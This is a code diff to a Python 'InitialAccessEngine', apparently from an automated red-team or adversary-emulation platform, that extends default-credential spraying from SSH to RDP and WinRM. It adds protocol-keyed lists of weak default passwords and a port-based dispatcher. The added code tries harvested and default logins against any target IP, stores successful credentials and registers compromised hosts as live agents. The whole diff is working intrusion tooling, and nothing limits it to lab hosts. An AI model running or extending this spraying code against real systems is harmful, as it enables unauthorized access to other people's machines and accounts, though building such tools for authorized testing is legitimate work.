@@ -8,9 +8,15 @@
 #
 # For commercial licensing, contact: [TODO: contact email]
 
-"""InitialAccessEngine — SSH credential testing and C2 agent bootstrapping."""
+"""InitialAccessEngine — multi-protocol credential testing and C2 agent bootstrapping.
+
+Supports SSH (direct), RDP, and WinRM (via MCP credential-checker server).
+New protocols can be added by appending to ``_PROTOCOL_MAP`` and
+``_CREDS_BY_PROTOCOL`` — no new methods required.
+"""
 
 import asyncio
+import json
 import logging
 import uuid
 from datetime import datetime, timezone
@@ -24,35 +30,215 @@ from app.ws_manager import ws_manager
 logger = logging.getLogger(__name__)
 
 # ---------------------------------------------------------------------------
-# Default credentials targeting Metasploitable 2
+# Credential lists grouped by protocol family
 # ---------------------------------------------------------------------------
-_DEFAULT_CREDS: list[tuple[str, str]] = [
-    # Linux distro & Vagrant box defaults (sorted by likelihood)
-    ("vagrant", "vagrant"),           # Vagrant boxes / Metasploitable 3
-    ("ubuntu", "ubuntu"),             # Ubuntu cloud images
-    ("pi", "raspberry"),              # Raspberry Pi OS
-    ("ec2-user", "ec2-user"),         # Amazon Linux AMI
-    ("centos", "centos"),             # CentOS cloud images
-    ("debian", "debian"),             # Debian cloud images
-    # Common weak / default passwords
-    ("root", "root"),
-    ("root", "toor"),                 # Kali / Metasploitable 2
-    ("root", "password"),
-    ("admin", "admin"),
-    ("admin", "password"),
-    ("administrator", "administrator"),
-    # Lab / CTF environments
-    ("msfadmin", "msfadmin"),         # Metasploitable 2
-    ("user", "user"),
-    # Network appliances
-    ("cisco", "cisco"),
-    ("ubnt", "ubnt"),
-    ("apc", "apc"),
+_CREDS_BY_PROTOCOL: dict[str, list[tuple[str, str]]] = {
+    "ssh": [
+        # Linux distro & Vagrant box defaults (sorted by likelihood)
+        ("vagrant", "vagrant"),
+        ("ubuntu", "ubuntu"),
+        ("pi", "raspberry"),
+        ("ec2-user", "ec2-user"),
+        ("centos", "centos"),
+        ("debian", "debian"),
+        # Common weak / default passwords
+        ("root", "root"),
+        ("root", "toor"),
+        ("root", "password"),
+        ("admin", "admin"),
+        ("admin", "password"),
+        ("administrator", "administrator"),
+        # Lab / CTF environments
+        ("msfadmin", "msfadmin"),
+        ("user", "user"),
+        # Network appliances
+        ("cisco", "cisco"),
+        ("ubnt", "ubnt"),
+        ("apc", "apc"),
+    ],
+    "windows": [
+        # AD / Windows defaults (shared by RDP and WinRM)
+        ("Administrator", "Password1"),
+        ("Administrator", "P@ssw0rd"),
+        ("Administrator", "Admin123"),
+        ("Administrator", "administrator"),
+        ("admin", "admin"),
+        ("admin", "password"),
+        ("admin", "P@ssw0rd"),
+        # Service accounts
+        ("svc_sql", "Password1"),
+        ("svc_backup", "Password1"),
+        # Lab / evaluation VMs
+        ("vagrant", "vagrant"),
+        ("IEUser", "Passw0rd!"),
+    ],
+}
+
+# Backward-compatible alias used by existing code
+_DEFAULT_CREDS = _CREDS_BY_PROTOCOL["ssh"]
+
+# ---------------------------------------------------------------------------
+# Protocol detection table
+# (port, service_keywords, protocol, mcp_tool_name, fact_trait, creds_key)
+#
+# To add a new protocol (e.g. SMB, LDAP, MSSQL):
+#   1. Add a creds_key entry in _CREDS_BY_PROTOCOL
+#   2. Add a row here
+#   3. Add the corresponding @mcp.tool() in credential-checker server.py
+# ---------------------------------------------------------------------------
+_PROTOCOL_MAP: list[tuple[int, tuple[str, ...], str, str | None, str, str]] = [
+    (22,   ("ssh", "unknown"),            "ssh",   None,                      "credential.ssh",   "ssh"),
+    (3389, ("ms-wbt-server", "unknown"),  "rdp",   "rdp_credential_check",   "credential.rdp",   "windows"),
+    (5985, ("wsman", "http", "unknown"),  "winrm", "winrm_credential_check", "credential.winrm", "windows"),
+    (5986, ("wsman", "https", "unknown"), "winrm", "winrm_credential_check", "credential.winrm", "windows"),
 ]
 
 
 class InitialAccessEngine:
-    """SSH-based initial access phase: credential spraying + agent bootstrapping."""
+    """Multi-protocol initial access: credential spraying + agent bootstrapping.
+
+    Entry point for recon pipeline: ``try_initial_access()`` dispatches to SSH
+    (direct) or RDP/WinRM (via MCP credential-checker) based on open ports.
+    """
+
+    async def try_initial_access(
+        self,
+        db: aiosqlite.Connection,
+        operation_id: str,
+        target_id: str,
+        ip: str,
+        services: list[dict],
+    ) -> InitialAccessResult:
+        """Orchestrate multi-protocol initial access based on detected open ports.
+
+        Iterates ``_PROTOCOL_MAP`` in order; SSH is tried first (fastest,
+        no MCP dependency), then RDP, then WinRM.  Returns the first
+        successful result.  If no targetable services are found or all
+        protocols fail, returns a combined failure.
+        """
+        attempted = 0
+        for port_num, svc_names, protocol, mcp_tool, trait, creds_key in _PROTOCOL_MAP:
+            if not any(
+                s.get("port") == port_num and s.get("service", "") in svc_names
+                for s in services
+            ):
+                continue
+
+            attempted += 1
+
+            if protocol == "ssh":
+                result = await self.try_ssh_login(
+                    db, operation_id, target_id, ip, port=port_num,
+                )
+            else:
+                result = await self._try_mcp_credential_check(
+                    db, operation_id, target_id, ip,
+                    protocol=protocol, mcp_tool=mcp_tool,
+                    trait=trait, creds_key=creds_key, port=port_num,
+                )
+
+            if result.success:
+                return result
+
+        if attempted == 0:
+            return InitialAccessResult(
+                success=False, method="none", credential=None,
+                agent_deployed=False, error="No targetable services found",
+            )
+        return InitialAccessResult(
+            success=False, method="none", credential=None,
+            agent_deployed=False,
+            error=f"All protocols failed ({attempted} attempted)",
+        )
+
+    # ------------------------------------------------------------------
+    # Generalized MCP credential check (RDP, WinRM, future protocols)
+    # ------------------------------------------------------------------
+
+    async def _try_mcp_credential_check(
+        self,
+        db: aiosqlite.Connection,
+        operation_id: str,
+        target_id: str,
+        ip: str,
+        *,
+        protocol: str,
+        mcp_tool: str,
+        trait: str,
+        creds_key: str,
+        port: int,
+    ) -> InitialAccessResult:
+        """Try credential spray via MCP credential-checker server.
+
+        Works for any protocol registered in ``_PROTOCOL_MAP`` — just
+        supply the matching ``mcp_tool`` name and ``trait``.
+        """
+        from app.services.mcp_client_manager import get_mcp_manager
+
+        mgr = get_mcp_manager()
+        if mgr is None or not mgr.is_connected("credential-checker"):
+            logger.debug(
+                "credential-checker MCP not available; skipping %s check for %s",
+                protocol.upper(), ip,
+            )
+            return InitialAccessResult(
+                success=False, method="none", credential=None,
+                agent_deployed=False,
+                error=f"credential-checker MCP not available for {protocol.upper()}",
+            )
+
+        harvested = await self._load_harvested_creds(db, operation_id)
+        seen = set(harvested)
+        creds = harvested + [
+            c for c in _CREDS_BY_PROTOCOL.get(creds_key, []) if c not in seen
+        ]
+
+        for username, password in creds:
+            try:
+                result = await mgr.call_tool(
+                    "credential-checker", mcp_tool,
+                    {"target": ip, "username": username, "password": password, "port": port},
+                )
+                text = (
+                    result["content"][0]["text"]
+                    if result.get("content")
+                    else "{}"
+                )
+                parsed = json.loads(text)
+
+                if parsed.get("facts"):
+                    cred_value = parsed["facts"][0]["value"]
+                    await self._write_credential_fact(
+                        db, operation_id, target_id, cred_value, trait=trait,
+                    )
+                    await self._register_agent(
+                        db, operation_id, target_id, ip,
+                        f"{username}:{password}", protocol=protocol,
+                    )
+                    logger.info(
+                        "%s login succeeded for %s@%s:%s",
+                        protocol.upper(), username, ip, port,
+                    )
+                    return InitialAccessResult(
+                        success=True,
+                        method=f"{protocol}_credential",
+                        credential=f"{username}:{password}",
+                        agent_deployed=False,
+                        error=None,
+                    )
+            except Exception:
+                logger.debug(
+                    "%s check failed for %s@%s:%s",
+                    protocol.upper(), username, ip, port,
+                )
+                continue
+
+        logger.warning("All %s credentials failed for %s:%s", protocol.upper(), ip, port)
+        return InitialAccessResult(
+            success=False, method="none", credential=None,
+            agent_deployed=False,
+            error=f"All {protocol.upper()} credentials failed",
+        )
 
     async def try_ssh_login(
         self,
@@ -215,26 +401,25 @@ class InitialAccessEngine:
     # Internal helpers
     # ------------------------------------------------------------------
 
-    async def _register_ssh_agent(
+    async def _register_agent(
         self,
         db: aiosqlite.Connection,
         operation_id: str,
         target_id: str,
         ip_address: str,
         credential: str,
+        protocol: str = "ssh",
     ) -> None:
-        """Register a synthetic SSH agent record after successful SSH login.
+        """Register a synthetic agent record after successful credential validation.
 
-        This creates an 'alive' agent entry so the OODA Act phase can route
-        techniques via DirectSSHEngine without requiring a real Caldera agent beacon.
-        paw format: 'SSH-{ip_address}'
+        paw format: ``'{PROTOCOL}-{ip_address}'`` (e.g. ``SSH-10.0.1.5``).
+        Platform is inferred from protocol: rdp/winrm → ``windows``, ssh → ``linux``.
         """
-        from datetime import datetime
-        from uuid import uuid4
-
-        paw = f"SSH-{ip_address}"
-        privilege = "root" if credential.startswith("root:") else "user"
-        now = datetime.now().isoformat()
+        paw = f"{protocol.upper()}-{ip_address}"
+        platform = "windows" if protocol in ("rdp", "winrm") else "linux"
+        is_admin = credential.startswith("root:") or credential.lower().startswith("administrator:")
+        privilege = "root" if is_admin else "user"
+        now = datetime.now(timezone.utc).isoformat()
 
         # Upsert: update existing agent or insert new one
         existing = await db.execute(
@@ -244,17 +429,21 @@ class InitialAccessEngine:
         row = await existing.fetchone()
         if row:
             await db.execute(
-                "UPDATE agents SET host_id=?, status='alive', privilege=?, last_beacon=? WHERE id=?",
-                (target_id, privilege, now, row[0]),
+                "UPDATE agents SET host_id=?, status='alive', privilege=?, platform=?, last_beacon=? WHERE id=?",
+                (target_id, privilege, platform, now, row[0]),
             )
         else:
             await db.execute(
                 """INSERT INTO agents
                     (id, paw, host_id, status, privilege, platform, operation_id, last_beacon)
-                VALUES (?, ?, ?, 'alive', ?, 'linux', ?, ?)""",
-                (str(uuid4()), paw, target_id, privilege, operation_id, now),
+                VALUES (?, ?, ?, 'alive', ?, ?, ?, ?)""",
+                (str(uuid.uuid4()), paw, target_id, privilege, platform, operation_id, now),
             )
         await db.commit()
+
+    # Backward-compatible alias
+    async def _register_ssh_agent(self, db, operation_id, target_id, ip_address, credential):
+        return await self._register_agent(db, operation_id, target_id, ip_address, credential, protocol="ssh")
 
     async def _mock_ssh_result(
         self,
@@ -296,7 +485,8 @@ class InitialAccessEngine:
         cursor = await db.execute(
             "SELECT value FROM facts "
             "WHERE operation_id = ? AND category = 'credential' "
-            "AND trait IN ('credential.ssh', 'credential.plaintext', 'credential.dumped') "
+            "AND trait IN ('credential.ssh', 'credential.rdp', 'credential.winrm', "
+            "'credential.plaintext', 'credential.dumped') "
             "ORDER BY score DESC, collected_at DESC",
             (operation_id,),
         )
@@ -406,6 +596,7 @@ class InitialAccessEngine:
         operation_id: str,
         target_id: str,
         cred_value: str,
+        trait: str = "credential.ssh",
     ) -> None:
         """Insert a credential fact into the facts table and broadcast it."""
         fact_id = str(uuid.uuid4())
@@ -416,21 +607,13 @@ class InitialAccessEngine:
             "(id, trait, value, category, source_technique_id, "
             "source_target_id, operation_id, score, collected_at) "
             "VALUES (?, ?, ?, ?, NULL, ?, ?, 1, ?)",
-            (
-                fact_id,
-                "credential.ssh",
-                cred_value,
-                "credential",
-                target_id,
-                operation_id,
-                now,
-            ),
+            (fact_id, trait, cred_value, "credential", target_id, operation_id, now),
         )
         await db.commit()
 
         fact_payload = {
             "id": fact_id,
-            "trait": "credential.ssh",
+            "trait": trait,
             "value": cred_value,
             "category": "credential",
             "source_target_id": target_id,
